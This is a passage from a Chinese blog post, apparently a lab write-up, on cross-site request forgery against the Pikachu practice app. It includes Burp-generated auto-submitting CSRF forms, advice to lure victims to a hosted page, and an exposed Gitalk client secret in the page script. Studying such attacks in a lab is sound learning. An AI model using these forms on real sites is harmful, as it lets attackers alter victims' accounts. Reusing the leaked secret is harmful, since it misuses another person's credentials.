├─op1</span><br><span class="line">│      │  │  └─op2</span><br><span class="line">│      │  ├─rce</span><br><span class="line">│      │  ├─sqli</span><br><span class="line">│      │  │  ├─sqli_header</span><br><span class="line">│      │  │  └─sqli_iu</span><br><span class="line">│      │  ├─ssrf</span><br><span class="line">│      │  │  └─ssrf_info</span><br><span class="line">│      │  ├─unsafedownload</span><br><span class="line">│      │  │  └─download</span><br><span class="line">│      │  ├─unsafeupload</span><br><span class="line">│      │  ├─unserilization</span><br><span class="line">│      │  ├─urlredirect</span><br><span class="line">│      │  ├─xss</span><br><span class="line">│      │  │  ├─xssblind</span><br><span class="line">│      │  │  └─xsspost</span><br><span class="line">│      │  └─xxe</span><br><span class="line">│      └─wiki</span><br><span class="line">│          └─image</span><br><span class="line">└─sql</span><br><span class="line">    ├─images</span><br><span class="line">    ├─index-1.html_files</span><br><span class="line">    │  └─icons</span><br><span class="line">    ├─index-2.html_files</span><br><span class="line">    │  └─icons</span><br><span class="line">    ├─index-3.html_files</span><br><span class="line">    │  └─icons</span><br><span class="line">    ├─index.html_files</span><br><span class="line">    │  └─icons</span><br><span class="line">    </span><br><span class="line">    ├─sql-connections</span><br><span class="line">    │  └─.idea</span><br><span class="line">    └─sqli-labs</span><br><span class="line">        ├─images</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>第二个小插曲就是我的mysql，就是启动不起来，会发现所有的什么端口之类的都被占用了<br>经过排查之后发现是梯子的问题，这里需要关闭系统代理<br>又或者是说，我们将clash改为tun模式，也就是一个虚拟网卡的模式，然后将系统代理给关闭了，这里注意开tun的时候记得点击那个服务模式再点击下载，最后就能成功了</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>原理：小黑想要修改大白的一个信息，我就自己注册一个账号，然后修改自己的信息，发现这个修改自己信息的链接是<a target="_blank" rel="noopener" href="http://www.xxx.com/edit.php?email=xiaohei@88.com&Change=Change">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change</a><br>然后就把链接伪装一下，最后只要让小白进行点击，最后个人信息就被修改了<br>和xss的一个区别<br>主要就是一个是csrf是需要借助用户本身的一个cookie的，但是xss就是自己伪造一个cookie</p>
+<h2 id="get"><a href="#get" class="headerlink" title="get"></a>get</h2><p>这里我们输入账号密码进行登陆，可以看下请求的这个方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=chain&amp;email=vince%40pikachu.com&amp;submit=submit HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">sec-ch-ua: </span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://127.0.0.1/vul/csrf/csrfget/csrf_get_edit.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=ok723k7i51ah50ciseafcnqr24</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里是登陆了一个人的账号密码，然后进行修改我们的这个个人信息<br>这里我们就选择使用bp里面自带的这个scrf的生成poc的一个工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;boy&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;18626545453&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;chain&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;vince&amp;#64;pikachu&amp;#46;com&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;);</span><br><span class="line">      document.forms[0].submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/vul/csrf/csrfget/csrf_get_edit.php">http://127.0.0.1/vul/csrf/csrfget/csrf_get_edit.php</a><br>可以修改里面的很多值，链接发给别人就可以了</p>
+<h1 id="post"><a href="#post" class="headerlink" title="post"></a>post</h1><p>此处为post传参，url不再显示，无法在使用伪造url的方法攻击。可以将生成的SCRF HTML放入自己写的HTML文件中，放在服务器上，并给用户请求者个html的链接<br>需要构造的SCRF.html</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1:8080/pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;boy&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;999999&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;nba&amp;#32;lakes&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;kobe&amp;#64;pikachu&amp;#46;com&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;);</span><br><span class="line">      document.forms[0].submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1:8080/pikachu-master/vul/csrf/csrfpost/csrf_post_edit.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;boy&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;222222&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;nba&amp;#32;lakes&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;kobe&amp;#64;pikachu&amp;#46;com&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;);</span><br><span class="line">      document.forms[0].submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>将我们写好的html文件放入服务器中，这里的话就是自己的pikachu目录下面<br><a target="_blank" rel="noopener" href="http://127.0.0.1:8080/pikachu-master/SCRF.html">http://127.0.0.1:8080/pikachu-master/SCRF.html</a><br>然后被攻击者可以访问该链接，只要点击修改，那么个人信息就将被改变</p>
+<h2 id="改token的"><a href="#改token的" class="headerlink" title="改token的"></a>改token的</h2><p>这里下载bp的一个插件SCRF Token Tracker<br>更改token就可以了<br>后面遇见相关的赛题或实战什么的再做总结</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">wuk0Ng</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://web-wuk0ng.github.io/2025/09/26/csrf/">https://web-wuk0ng.github.io/2025/09/26/csrf/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">wuk0Ng</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                                    <span class="chip bg-color">比赛</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/aliyunpay.png" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <!-- 引入 Gitalk 官方 CSS（国内 CDN） -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+<!-- 引入主题自定义 CSS（如有需要，若 my-gitalk.css 是本地文件则保留原路径） -->
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+  <div class="comment_headling">
+    <i class="fas fa-comments fa-fw"></i>
+    <span>评论</span>
+  </div>
+  <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<!-- 引入 Gitalk 官方 JS（国内 CDN） -->
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+  let gitalk = new Gitalk({
+    clientID: 'Ov23liTNlK9NLcZwFSo8',
+    clientSecret: '7472cd54d6ca5e38d14f6d1b5176299bb4cf4ebe',
+    repo: 'blog---comments',
+    owner: 'web-wuk0Ng',
+    admin: ["web-wuk0Ng"],
+    id: '2025-09-26T16-30-00',
+    distractionFreeMode: false
+  });
+
+  gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2025/09/26/csrf/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="CSRF">
+                        
+                        <span class="card-title">CSRF</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-09-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                        <span class="chip bg-color">比赛</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/09/25/py-web/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="py-web">
+                        
+                        <span class="card-title">py-web</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-09-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                        <span class="chip bg-color">比赛</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2025</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">wuk0Ng</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/web-wuk0Ng" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:3134985131@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3442584626" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3442584626" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
